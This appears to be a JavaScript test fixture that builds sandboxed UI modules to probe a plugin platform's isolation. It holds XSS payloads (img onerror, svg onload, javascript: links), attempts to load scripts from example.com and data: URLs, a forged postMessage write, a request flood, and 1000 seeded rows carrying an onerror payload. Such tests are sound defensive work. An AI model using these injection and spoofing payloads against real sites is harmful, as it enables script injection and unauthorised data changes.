// cr-modules-008 held-out h1-h8: the extra Northwind fixture modules both surfaces' held-out walks use.
import fs from 'node:fs';
import path from 'node:path';
import { execFileSync } from 'node:child_process';

const coll = (name, fields, extra = '') => `name: ${name}\ndescription: ${name} for the held-out walk.\nuse_when: never\nids:\n  from: '{{ name | slug }}'\nfields:\n${Object.entries(fields).map(([f, y]) => `  ${f}:\n${y.split('\n').map((l) => `    ${l}`).join('\n')}`).join('\n')}\n${extra}`;

const PATTERN = `export default ({ registerApp, registerEdit, registerView }) => {
	const { defineComponent, h, onMounted } = window.Vue;
	const st = async (p, init) => { try { const r = await fetch(p, init); return r.status + ':' + JSON.stringify(await r.json()).slice(0, 240); } catch { return 'threw'; } };
	const J = (m, b) => ({ method: m, headers: { 'content-type': 'application/json' }, body: b === undefined ? undefined : JSON.stringify(b) });
	const out = (k, v) => { document.body.dataset[k] = String(v); };
	const App = defineComponent({ setup() { onMounted(async () => {
		for (const c of ['collections', 'other-items', 'tasks']) { const e = encodeURIComponent(c);
			out('h2read_' + c.replace(/-/g, ''), await st('/api/collections/' + e + '/records'));
			out('h2write_' + c.replace(/-/g, ''), await st('/api/collections/' + e + '/records', J('POST', { name: 'h2' }))); }
		for (const k of ['$source', 'id', 'created', 'stub']) {
			out('h6post_' + k.replace('$', 'd'), await st('/api/collections/pattern-items/records', J('POST', { name: 'h6 ' + k, [k]: k === 'stub' ? true : 'x' })));
			out('h6patch_' + k.replace('$', 'd'), await st('/api/collections/pattern-items/records/pattern-one', J('PATCH', { [k]: k === 'stub' ? true : 'x' }))); }
		out('h6layerpatch', await st('/api/collections/pattern-items/records/pattern-held', J('PATCH', { name: 'x' })));
		out('h6layerdelete', await st('/api/collections/pattern-items/records/pattern-held', J('DELETE')));
		out('h6target', await st('/api/collections/pattern-items/records?target=hq', J('POST', { name: 'h6 target' })));
		out('h6clean', await st('/api/collections/pattern-items/records', J('POST', { name: 'h6 clean' })));
		out('done', 1);
	}); return () => h('p', 'pattern'); } });
	registerApp({ id: 'pattern', label: 'Pattern', icon: 'beaker', routes: [{ path: '', component: App }] });
	const Edit = defineComponent({ props: ['value', 'field', 'record'], emits: ['update:value'], setup() { onMounted(async () => {
		out('h3read', await st('/api/collections/pattern-items/records'));
		out('h3save', await st('/api/collections/pattern-items/records/pattern-one', J('PATCH', { name: 'Pattern one saved' })));
		out('done', 1);
	}); return () => h('input', { class: 'pattern-edit' }); } });
	registerEdit({ id: 'pattern-edit', name: 'pattern edit', types: ['string'], component: Edit });
	registerView({ id: 'pattern-view', name: 'pattern view', types: ['string'], component: Edit });
};
`;

const PROBE2 = `export default ({ registerApp, registerEdit, registerView, registerList }) => {
	const { defineComponent, h, onMounted } = window.Vue;
	const st = async (p, init) => { try { const r = await fetch(p, init); return r.status + ':' + JSON.stringify(await r.json()).slice(0, 200); } catch { return 'threw'; } };
	const out = (k, v) => { document.body.dataset[k] = String(v); };
	const mark = "document.body.dataset.marker='ran';fetch('/api/commit',{method:'POST'});parent.postMessage({dt:1,id:999,op:'request',method:'POST',path:'/commit'},'*')";
	const App = defineComponent({ setup() { onMounted(async () => {
		const host = document.createElement('div'); document.body.appendChild(host);
		host.innerHTML = '<img src=x onerror="' + mark + '">' + '<svg onload="' + mark + '"></svg>' + '<a id="js" href="javascript:' + mark + '">x</a>';
		try { document.getElementById('js').click(); } catch {}
		out('h4location', location.href.slice(0, 40));
		const ext = (attrs, key) => new Promise((res) => { const s = document.createElement('script'); Object.assign(s, attrs); s.onerror = () => res('refused'); s.onload = () => res('LOADED'); document.head.appendChild(s); setTimeout(() => res('timeout'), 3000); }).then((v) => out(key, v));
		await ext({ src: 'https://example.com/x.js', integrity: window.__guestHash || 'sha256-AAAA', crossOrigin: 'anonymous' }, 'h5integrity');
		await ext({ src: 'https://example.com/y.js', nonce: 'anything' }, 'h5nonce');
		await ext({ src: 'data:text/javascript,document.body.dataset.marker=%22data%22' }, 'h5data');
		try { await fetch('https://example.com/remote.js'); out('h5blobfetch', 'fetched'); } catch { out('h5blobfetch', 'failed'); }
		const local = URL.createObjectURL(new Blob(["window.__blobRan=1"], { type: 'text/javascript' }));
		await ext({ src: local }, 'h5localblob'); out('h5localblobran', String(!!window.__blobRan));
		out('h5commit', await st('/api/commit', { method: 'POST', body: '{}' }));
		setTimeout(() => { out('h4marker', document.body.dataset.marker ?? 'none'); out('h4location2', location.href.slice(0, 40)); out('done', 1); }, 1500);
	}); return () => h('p', 'probe2'); } });
	registerApp({ id: 'probe2', label: 'Probe 2', icon: 'beaker', routes: [{ path: '', component: App }] });
	const Edit = defineComponent({ props: ['value', 'field', 'record'], setup() { onMounted(async () => {
		const flood = await Promise.all(Array.from({ length: 30 }, () => fetch('/api/collections/probe-items/records?limit=1').then((r) => r.status)));
		out('h3flood429', flood.filter((x) => x === 429).length);
		parent.postMessage({ dt: 1, id: 1, op: 'request', module: 'pattern', method: 'PATCH', path: '/collections/pattern-items/records/pattern-one', body: { name: 'spoofed' } }, '*');
		out('h3write', await st('/api/collections/pattern-items/records/pattern-one', { method: 'PATCH', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ name: 'probe wrote' }) }));
		out('done', 1);
	}); return () => h('i', 'probe-edit'); } });
	registerEdit({ id: 'probe-edit', name: 'probe edit', types: ['string'], component: Edit });
	registerView({ id: 'probe-view', name: 'probe view', types: ['string'], component: Edit });
	registerView({ id: 'probe-cell', name: 'probe cell', types: ['string'], component: { props: ['value'], render() { return h('span', { class: 'evil', style: 'position:fixed', onclick: 'x()', title: 't' }, [h('a', { href: 'javascript:alert(1)' }, String(this.value ?? ''))]); } } });
	const List = defineComponent({ props: ['state', 'collection'], setup(p) { return () => { const s = p.state; const rows = s.items.items.value;
		document.body.dataset.h7rows = String(rows.length); document.body.dataset.h7titles = rows.slice(0, 6).map((r) => s.recordTitleOf(r)).join('|');
		document.body.dataset.h7keys = rows.slice(0, 50).some((r) => '$last-commit-message' in r) ? 'leaked' : 'clean';
		return h('ul', rows.slice(0, 20).map((r) => h('li', s.recordTitleOf(r)))); }; } });
	registerList({ id: 'probe-list', name: 'probe list', component: List, fillsHeight: true });
};
`;

/** Adds the held-out modules, a layer record of pattern-items, and the 1000 probe rows; compiles; returns the module names. */
export function addHeldout(f) {
	const mod = (name, files) => { for (const [rel, text] of Object.entries(files)) { const p = path.join(f.root, 'modules', name, rel); fs.mkdirSync(path.dirname(p), { recursive: true }); fs.writeFileSync(p, text); } };
	const pkg = (name, extra = {}) => JSON.stringify({ name, private: true, version: '0.0.1', dreamteamer: { title: name, description: `the ${name} module of the held-out walk`, engine: '>=0.43.0', ...extra } }, null, '\t');
	mod('pattern', { 'package.json': pkg('pattern'), 'collections/pattern-items.collection.yaml': coll('pattern-items', { name: 'type: string\nrequired: true', pv: 'type: string\ndisplay:\n  editor: pattern-edit\n  viewer: pattern-view', qv: 'type: string\ndisplay:\n  editor: probe-edit\n  viewer: probe-view' }), 'ui/app.js': PATTERN });
	mod('probe2', { 'package.json': pkg('probe2', { peer_collections: ['projects', 'pattern-items'] }), 'collections/probe-items.collection.yaml': coll('probe-items', { name: 'type: string\nrequired: true\ndisplay:\n  viewer: probe-cell', ref: 'type: projects', pat: 'type: pattern-items' }, "record_title: '{{ name }} — {{ ref }}'\n"), 'ui/app.js': PROBE2,
		'ui-views/probe-list.ui-view.yaml': 'route: /probe-list\nname: probe list\nscope: collection\ncollection: collections/probe-items\ndisplay:\n  list:\n    layout: probe-list\n' });
	mod('other', { 'package.json': pkg('other'), 'collections/other-items.collection.yaml': coll('other-items', { name: 'type: string\nrequired: true' }) });
	mod('named-only', { 'package.json': pkg('named-only'), 'collections/named-items.collection.yaml': coll('named-items', { name: 'type: string\nrequired: true' }), 'ui/app.js': 'export function register() {}\n' });
	mod('meta-url', { 'package.json': pkg('meta-url'), 'collections/meta-items.collection.yaml': coll('meta-items', { name: 'type: string\nrequired: true' }), 'ui/app.js': "export default () => { new URL('./x.json', import.meta.url); return fetch(new URL('./x.json', import.meta.url)); };\n" });
	mod('chunked', { 'package.json': pkg('chunked'), 'collections/chunk-items.collection.yaml': coll('chunk-items', { name: 'type: string\nrequired: true' }), 'ui/app.js': "export default async () => { await import('./chunk-a.js'); };\n" });
	const rec = (dir, id, body) => { fs.mkdirSync(dir, { recursive: true }); const suffix = path.basename(dir).replace(/s$/, ''); fs.writeFileSync(path.join(dir, `${id}.${suffix}.md`), `---\n${body}---\n`); };
	const ids = fs.readdirSync(path.join(f.root, 'data', 'projects')).map((n) => n.split('.')[0]);
	for (let i = 0; i < 1000; i++) rec(path.join(f.root, 'data', 'probe-items'), `p${String(i).padStart(4, '0')}`, `name: Row ${i} <img src=x onerror="document.body.dataset.marker='cell'">\nref: projects/${i % 2 ? ids[i % ids.length] : 'missing-' + i}\n`);
	rec(path.join(f.root, 'data', 'pattern-items'), 'pattern-one', 'name: Pattern one\npv: pattern view\nqv: probe view\n');
	for (const [c, id] of [['other-items', 'other-one'], ['named-items', 'n1'], ['meta-items', 'm1'], ['chunk-items', 'c1']]) rec(path.join(f.root, 'data', c), id, `name: ${id}\n`);
	// the layer also holds one pattern-items record
	const layer = path.join(f.root, 'git_modules', 'northwind-archive');
	rec(path.join(layer, 'data', 'pattern-items'), 'pattern-held', 'name: Pattern held by the layer\n');
	execFileSync('git', ['add', '-A'], { cwd: layer }); execFileSync('git', ['-c', 'user.name=Dana Oren', '-c', 'user.email=dana@northwind.example', 'commit', '-qm', 'pattern-held'], { cwd: layer });
	const pkgFile = path.join(f.root, 'package.json'); const p = JSON.parse(fs.readFileSync(pkgFile, 'utf8'));
	p.dreamteamer.git_modules['northwind-archive'].records = [...p.dreamteamer.git_modules['northwind-archive'].records, 'pattern-items'];
	fs.writeFileSync(pkgFile, JSON.stringify(p, null, '\t') + '\n');
	const c = f.dt('compile'); if (c.status !== 0) throw new Error(`compile: ${c.stdout}\n${c.stderr}`);
	execFileSync('git', ['add', '-A'], { cwd: f.root }); execFileSync('git', ['-c', 'user.name=Dana Oren', '-c', 'user.email=dana@northwind.example', 'commit', '-qm', 'held-out modules'], { cwd: f.root });
	return { ui: fs.readdirSync(path.join(f.root, '.dreamteamer', 'ui')) };
}
